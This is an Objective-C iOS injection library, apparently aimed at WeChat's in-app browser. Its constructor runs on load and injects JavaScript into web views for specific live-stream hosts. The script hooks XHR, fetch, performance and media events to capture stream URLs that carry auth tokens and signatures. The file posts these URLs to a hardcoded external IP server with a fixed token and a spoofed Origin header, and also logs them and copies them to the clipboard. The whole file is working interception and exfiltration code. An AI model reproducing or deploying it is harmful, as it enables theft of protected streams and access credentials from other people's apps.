
//
// ALIWeChatSniffer_AggressiveSafe.m
// More aggressive (but still safe) collector: earlier injection, more iframe coverage, extra retries,
// local file logging at /tmp/ali_streams.log, keeps AV AccessLog listeners. DOES NOT use swizzle/fishhook.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }

static const NSTimeInterval kScanInterval       = 0.7;
static const NSTimeInterval kInjectDelay        = 0.25;
static const NSTimeInterval kDedupeWindow       = 60.0;
static const double        kProgressThreshold   = 0.2;  // more aggressive: inject earlier
static const NSTimeInterval kBootGateDelay      = 0.8;

static const BOOL kPopupOnInject = YES;
static const BOOL kPopupOnHit    = YES;
static const BOOL kCopyOnHit     = YES;
static const BOOL kWriteToFile   = YES; // write hits to /tmp/ali_streams.log

static NSArray<NSString*> *TargetHosts(void){
    return @[@"ukmdg.cn", @"vzuk.ukmdg.cn", @"wehfws.vzuk.ukmdg.cn", @"vzan.com", @"weizan.com"];
}

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
static BOOL g_started = NO;
static NSString *logPath(void){ return @"/tmp/ali_streams.log"; }

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".mp4"]||
        [s containsString:@".ts"]  ||[s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"txkey"]||
        [s containsString:@"token="]||[s containsString:@"sign="]||[s containsString:@"auth="]) return YES;
    if ([s containsString:@"phonelive"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]||
        [s containsString:@"ukmdg"]||[s containsString:@"vzuk"]||[s containsString:@"wehfws"]) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u], *now = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}

static void appendToLogFile(NSString *line){
    if (!kWriteToFile) return;
    @try{
        NSString *p = logPath();
        NSFileHandle *fh = nil;
        if ([[NSFileManager defaultManager] fileExistsAtPath:p]) fh = [NSFileHandle fileHandleForWritingAtPath:p];
        if (!fh) { [[NSFileManager defaultManager] createFileAtPath:p contents:nil attributes:@{NSFilePosixPermissions: @0644}]; fh = [NSFileHandle fileHandleForWritingAtPath:p]; }
        if (fh){
            [fh seekToEndOfFile];
            NSString *s = [line stringByAppendingString:@"\n"];
            [fh writeData:[s dataUsingEncoding:NSUTF8StringEncoding]];
            [fh closeFile];
        }
    }@catch(__unused NSException *e){}
}

static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
    if (idx >= paths.count) return;
    NSString *url = [kPushHost stringByAppendingString:paths[idx]];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
    req.HTTPMethod = @"POST";
    [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
    req.HTTPBody = body;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
        NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
    }] resume];
}
static void postText(NSString *text){
    if (!text) return;
    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
}

static NSString *jsonStringify(NSDictionary *obj){
    if (!obj) return nil;
    NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
    return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
}

static void popup_safe(NSString *msg, NSString *copyText){
    if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} });
    on_main(^{ @try{
        UIWindow *w = nil;
        if (@available(iOS 13.0,*)) {
            for (UIScene *s in UIApplication.sharedApplication.connectedScenes){
                if (![s isKindOfClass:[UIWindowScene class]]) continue;
                UIWindowScene *sc = (UIWindowScene*)s;
                if (sc.activationState==UISceneActivationStateForegroundActive){
                    for (UIWindow *win in sc.windows) if (win.isKeyWindow) { w=win; break; }
                    if (w) break;
                }
            }
        }
        if (!w) w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
        if (!w) return;
        UIViewController *vc = w.rootViewController;
        while (vc.presentedViewController) vc = vc.presentedViewController;
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:nil message:msg preferredStyle:UIAlertControllerStyleAlert];
        if (copyText.length){
            [ac addAction:[UIAlertAction actionWithTitle:@"复制 URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                UIPasteboard.generalPasteboard.string = copyText;
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
        [vc presentViewController:ac animated:YES completion:nil];
    }@catch(__unused NSException *e){} });
}

static void handleRawEvent(NSDictionary *evt){
    if (!evt) return;
    NSString *url = evt[@"url"];
    if (url && looksLikeStream(url) && !dedupe_skip(url)){
        NSString *js = jsonStringify(evt); if (js) postText(js);
        NSString *logLine = [NSString stringWithFormat:@"%f | JS_HIT | %@ | %@", [[NSDate date] timeIntervalSince1970], evt[@"from"]?:evt[@"type"]?:@"inpage", url];
        appendToLogFile(logLine);
        if (kPopupOnHit){
            if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
            popup_safe([NSString stringWithFormat:@"捕获直播流：%@", url], url);
        }
    }
}

static void handleCapturedURL(NSString *url, NSString *from){
    if (!url) return;
    if (!looksLikeStream(url)) return;
    if (dedupe_skip(url)) return;
    NSDictionary *evt = @{@"type": @"NATIVE_HIT", @"from": from?:@"native", @"url": url, @"ts": @([[NSDate date] timeIntervalSince1970]*1000)};
    NSString *s = jsonStringify(evt); if (s) postText(s);
    NSString *logLine = [NSString stringWithFormat:@"%f | NATIVE_HIT | %@ | %@", [[NSDate date] timeIntervalSince1970], from?:@"native", url];
    appendToLogFile(logLine);
    if (kPopupOnHit){
        if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; });
        popup_safe([NSString stringWithFormat:@"原生捕获直播流：%@", url], url);
    }
}

static NSString *inpageJS(void){
    return @
"(function(){try{"
 "function send(t,d){try{var p=d||{};p.type=t;p.ts=Date.now();p.page=location.href;p.ua=navigator.userAgent;"
  "if(window.webkit&&window.webkit.messageHandlers&&window.webkit.messageHandlers.__ALI_SNIF__){window.webkit.messageHandlers.__ALI_SNIF__.postMessage(p);} }catch(e){} }"
 "function looks(u){if(!u)return false;u=(''+u).toLowerCase();"
  "if(u.indexOf('.m3u8')!=-1||u.indexOf('.flv')!=-1||u.indexOf('.mp4')!=-1||u.indexOf('.ts')!=-1||u.indexOf('rtmp://')!=-1) return true;"
  "if(u.indexOf('auth_key=')!=-1||u.indexOf('txsecret')!=-1||u.indexOf('txkey')!=-1||u.indexOf('token=')!=-1||u.indexOf('sign=')!=-1||u.indexOf('auth=')!=-1) return true;"
  "if(u.indexOf('phonelive')!=-1||u.indexOf('vzan')!=-1||u.indexOf('weizan')!=-1||u.indexOf('ukmdg')!=-1||u.indexOf('vzuk')!=-1||u.indexOf('wehfws')!=-1) return true;return false;}"
 "function hit(from,u){try{send('HIT',{from:from,url:u});}catch(e){}}"
 "send('INJECT_OK',{}); send('PAGE_READY',{});"
 // aggressively scan existing elements + observe
 "(function(){try{var nodes=document.querySelectorAll('video,audio,source,iframe,link[rel=\\'preload\\'],script');for(var i=0;i<nodes.length;i++){var n=nodes[i];var u=n.src||n.href||n.currentSrc||'';if(u){send('RES_INIT',{from:n.tagName||n.nodeName,url:u}); if(looks(u)) hit('init-scan',u);}}}catch(e){} })();"
 // xhr/fetch hooks (same as before)
 "(function(){var O=XMLHttpRequest.prototype.open,S=XMLHttpRequest.prototype.send;if(!XMLHttpRequest.prototype.__ali_patched__){XMLHttpRequest.prototype.__ali_patched__=true;"
   "XMLHttpRequest.prototype.open=function(m,u){try{this.__ali_u=u?u.toString():'';this.__ali_m=(m||'').toString();}catch(e){}return O.apply(this,arguments)};"
   "XMLHttpRequest.prototype.send=function(b){try{var self=this,u=self.__ali_u||'',m=self.__ali_m||'';if(u)send('XHR_REQ',{from:'xhr',url:u,method:m});"
     "var onload=function(){try{var ct=(self.getResponseHeader?self.getResponseHeader('Content-Type'):'')||'';var st=(self.status||0);var sample=null;"
       "if(ct.toLowerCase().indexOf('mpegurl')!=-1&&self.responseText){sample=self.responseText.slice(0,256);}else if(self.responseText&&self.responseText.indexOf('#EXTM3U')!=-1){sample=self.responseText.slice(0,256);ct=ct||'application/vnd.apple.mpegurl';}"
       "send('XHR_RSP',{from:'xhr',url:u,method:m,status:st,ctype:ct,sample:sample}); if(looks(u)) hit('xhr',u);}catch(e){} };"
     "this.addEventListener&&this.addEventListener('load',onload);}catch(e){}return S.apply(this,arguments)}; } })();"
 "(function(){if(!window.fetch||window.fetch.__ali_patched__)return;var F=window.fetch;window.fetch.__ali_patched__=true;window.fetch=function(i,init){try{var u=(typeof i==='string')?i:(i&&i.url)||'';var m=(init&&init.method)||'GET';if(u)send('FETCH_REQ',{from:'fetch',url:u,method:m});return F.apply(this,arguments).then(function(r){try{var ct=r.headers&&r.headers.get&&r.headers.get('content-type')||'';var st=r.status||0;var c=r.clone&&r.clone();if(c&&c.text){c.text().then(function(t){var sample=null;if(t&&t.indexOf('#EXTM3U')!=-1){sample=t.slice(0,256);if(!ct)ct='application/vnd.apple.mpegurl';}send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct,sample:sample});}).catch(function(){send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});});}else{send('FETCH_RSP',{from:'fetch',url:u,method:m,status:st,ctype:ct});} if(looks(u)) hit('fetch',u);}catch(e){}return r;});}catch(e){return F.apply(this,arguments)}})();"
 // perf observer
 "(function(){if(!('PerformanceObserver'in window))return;try{var seen=new Set();var ob=new PerformanceObserver(function(list){try{var arr=list.getEntries();for(var i=0;i<arr.length;i++){var e=arr[i];var u=e.name||'';if(!u||seen.has(u))continue;seen.add(u);send('RES',{from:'perf',url:u,initiator:e.initiatorType||''}); if(looks(u)) hit('perf',u);}}catch(e){}});ob.observe({type:'resource',buffered:true});}catch(e){}})();"
 // media + mutation observer
 "(function(){if(window.__ali_media_v3__)return;window.__ali_media_v3__=true;function report(el,tag,ev){try{var s=el.currentSrc||el.src||((el.querySelector&&el.querySelector('source'))||{}).src||'';if(s){send('MEDIA',{from:tag+':'+ev,url:s}); if(looks(s)) hit(tag,s);}}catch(e){}}try{var vs=document.querySelectorAll&&document.querySelectorAll('video,audio,source');for(var k=0;k<(vs?vs.length:0);k++){var el=vs[k];report(el,el.tagName.toLowerCase(),'init');el.addEventListener&&el.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);}var obs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i];if(!n)continue; if(n.tagName){var t=n.tagName.toLowerCase(); if(t==='video'||t==='audio'){report(n,t,'add'); n.addEventListener&&n.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} if(t==='source'){var u=n.src||n.currentSrc||''; if(u) { send('MEDIA_SET',{from:'mut',url:u}); if(looks(u)) hit('mut',u); } } } if(n.querySelectorAll){var subs=n.querySelectorAll('video,audio,source'); for(var j=0;j<subs.length;j++){var el2=subs[j]; var tg=el2.tagName.toLowerCase(); if(tg==='source'){var u2=el2.src||''; if(u2){ send('MEDIA_SET',{from:'mut-sub',url:u2}); if(looks(u2)) hit('mut-sub',u2); } } else if(tg==='video'||tg==='audio'){ report(el2,tg,'sub'); el2.addEventListener&&el2.addEventListener('play',function(){report(this,this.tagName.toLowerCase(),'play')},false);} } }}}}); obs.observe(document.documentElement||document.body,{childList:true,subtree:true}); }catch(e){} })();"
 // iframe watch
 "(function(){if(window.__ali_iframe__)return;window.__ali_iframe__=true;function repIF(f,ev){try{var u=f.src||''; if(u){send('IFRAME',{from:'iframe:'+ev,url:u}); if(looks(u)) hit('iframe',u);} }catch(e){} }var iobs=new MutationObserver(function(a){a.forEach(function(m){if(m.addedNodes){for(var i=0;i<m.addedNodes.length;i++){var n=m.addedNodes[i]; if(n&&n.tagName&&n.tagName.toLowerCase()==='iframe'){repIF(n,'add');}}}})}); iobs.observe(document.documentElement||document.body,{childList:true,subtree:true}); var ifs=document.querySelectorAll&&document.querySelectorAll('iframe'); for(var i=0;i<(ifs?ifs.length:0);i++){repIF(ifs[i],'init');} } )();"
 "console.log('[ALI_SNIF] injected aggressive v1');"
"}catch(e){console.log('[ALI_SNIF] inject error',e)}})();";
}

@interface ALIMessageHandler : NSObject <WKScriptMessageHandler> @end
@implementation ALIMessageHandler
- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if (![message.body isKindOfClass:[NSDictionary class]]) return;
    handleRawEvent((NSDictionary*)message.body);
}
@end
static ALIMessageHandler *g_handler = nil;
static const void *kInjectedKey = &kInjectedKey;
static const void *kKVOKey      = &kKVOKey;

static BOOL hostMatches(NSURL *url){
    if (!url.host) return NO;
    NSString *h = url.host.lowercaseString;
    for (NSString *pat in TargetHosts()) if ([h hasSuffix:pat.lowercaseString]) return YES;
    return NO;
}
static void prime_userScript_for_allFrames(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    @try{
        WKUserContentController *ucc = wv.configuration.userContentController;
        for (WKUserScript *s in ucc.userScripts) if ([s.source containsString:@"ALI_SNIF"]) return;
        WKUserScript *us = [[WKUserScript alloc] initWithSource:inpageJS()
                                                  injectionTime:WKUserScriptInjectionTimeAtDocumentEnd
                                               forMainFrameOnly:NO];
        [ucc addUserScript:us];
        if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
            @try{ [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"]; }@catch(__unused NSException *e){}
        }
    }@catch(__unused NSException *e){}
}
static void try_inject_when_ready(WKWebView *wv){
    if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
    if (wv.estimatedProgress < kProgressThreshold) return;
    [wv evaluateJavaScript:@"document.readyState" completionHandler:^(id val, NSError *err){
        if (err) return;
        NSString *rs = [val isKindOfClass:[NSString class]] ? val : @"";
        if (![rs isEqualToString:@"complete"] && ![rs isEqualToString:@"interactive"]) return;
        NSNumber *flag = objc_getAssociatedObject(wv, kInjectedKey);
        if (flag.boolValue) return;
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kInjectDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            if (!wv || !wv.configuration || !wv.configuration.userContentController) return;
            NSURL *u = wv.URL; if (!hostMatches(u)) return;
            objc_setAssociatedObject(wv, kInjectedKey, @(YES), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
            WKUserContentController *ucc = wv.configuration.userContentController;
            @try{
                if ([ucc respondsToSelector:@selector(removeScriptMessageHandlerForName:)]) {
                    [ucc removeScriptMessageHandlerForName:@"__ALI_SNIF__"];
                }
                if (!g_handler) g_handler = [ALIMessageHandler new];
                [ucc addScriptMessageHandler:g_handler name:@"__ALI_SNIF__"];
            }@catch(__unused NSException *e){}
            [wv evaluateJavaScript:inpageJS() completionHandler:nil];
            if (kPopupOnInject){
                if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = (wv.URL.absoluteString ?: @""); });
                on_main(^{ @try{ UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject; if (w) { UIAlertController *ac = [UIAlertController alertControllerWithTitle:nil message:[NSString stringWithFormat:@"JS 注入（激进）已就绪：%@", w.URL?@"":@"" ] preferredStyle:UIAlertControllerStyleAlert]; [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]]; UIViewController *vc = w.rootViewController; while (vc.presentedViewController) vc = vc.presentedViewController; [vc presentViewController:ac animated:YES completion:nil]; } }@catch(__unused NSException *e){} });
            }
        });
    }];
}

@interface _ALIKVOBox : NSObject
@property (nonatomic, weak) WKWebView *wv;
@end
@implementation _ALIKVOBox
- (void)dealloc{
    @try{ [self.wv removeObserver:self forKeyPath:@"URL"]; [self.wv removeObserver:self forKeyPath:@"estimatedProgress"]; }@catch(__unused NSException *e){}
}
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)ctx{
    WKWebView *wv = (WKWebView *)object; if (![wv isKindOfClass:[WKWebView class]]) return;
    if ([keyPath isEqualToString:@"URL"] || [keyPath isEqualToString:@"estimatedProgress"]) {
        NSURL *u = wv.URL;
        if (hostMatches(u)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
}
@end
static void attach_kvo_if_needed(WKWebView *wv){
    if (!wv) return;
    _ALIKVOBox *box = objc_getAssociatedObject(wv, kKVOKey);
    if (box) return;
    box = [_ALIKVOBox new]; box.wv = wv;
    objc_setAssociatedObject(wv, kKVOKey, box, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    @try{
        [wv addObserver:box forKeyPath:@"URL" options:NSKeyValueObservingOptionNew context:NULL];
        [wv addObserver:box forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:NULL];
    }@catch(__unused NSException *e){}
}
static void walk_view(UIView *v){
    if (!v) return;
    Class WK = NSClassFromString(@"WKWebView");
    if (WK && [v isKindOfClass:WK]){
        WKWebView *wv = (WKWebView *)v;
        attach_kvo_if_needed(wv);
        if (hostMatches(wv.URL)) { prime_userScript_for_allFrames(wv); try_inject_when_ready(wv); }
    }
    for (UIView *sub in v.subviews) walk_view(sub);
}
static void scan_loop(void){
    on_main(^{
        @try{ for (UIWindow *w in UIApplication.sharedApplication.windows) walk_view(w); }@catch(__unused NSException *e){}
    });
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kScanInterval*NSEC_PER_SEC)), gq, ^{ scan_loop(); });
}

static void installAVObservers(void){
    @try{
        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
        if (!g_accessLogToken1){
            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(accessLog)]) {
                        id log = [item accessLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            id ev = [log events].lastObject;
                            SEL sel = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                            if (ev && [ev respondsToSelector:sel]) {
                                NSString *uri = [ev performSelector:sel];
                                if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); });
                            }
#pragma clang diagnostic pop
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
        if (!g_accessLogToken2){
            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
                @try{
                    id item = note.object; if (!item) return;
                    if ([item respondsToSelector:@selector(errorLog)]) {
                        id log = [item errorLog];
                        if (log && [log respondsToSelector:@selector(events)]) {
                            for (id ev in [log events]){
                                SEL sel2 = NSSelectorFromString(@"URI");
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                                if (ev && [ev respondsToSelector:sel2]) {
                                    NSString *uri2 = [ev performSelector:sel2];
                                    if (uri2.length) dispatch_async(gq, ^{ handleCapturedURL(uri2, @"AVErrorLog"); });
                                }
#pragma clang diagnostic pop
                            }
                        }
                    }
                }@catch(__unused NSException *e){}
            }];
        }
    }@catch(__unused NSException *e){}
}

static void start_if_needed(void){
    if (g_started) return; g_started = YES;
    on_main(^{
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)),
                       dispatch_get_main_queue(), ^{
            scan_loop();
            installAVObservers();
            if (kWriteToFile) appendToLogFile([NSString stringWithFormat:@"%f | START | aggressive", [[NSDate date] timeIntervalSince1970]]);
        });
    });
}

__attribute__((constructor))
static void ALIWeChatSniffer_AggressiveSafe_Init(void){
    if (!gq)    gq    = dispatch_queue_create("com.ali.wechat.aggressive", DISPATCH_QUEUE_SERIAL);
    if (!g_seen) g_seen = [NSMutableDictionary dictionary];
    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    if (NSClassFromString(@"UIScene")){
        [nc addObserverForName:@"UISceneDidActivateNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
        [nc addObserverForName:@"UISceneWillEnterForegroundNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
    }
}
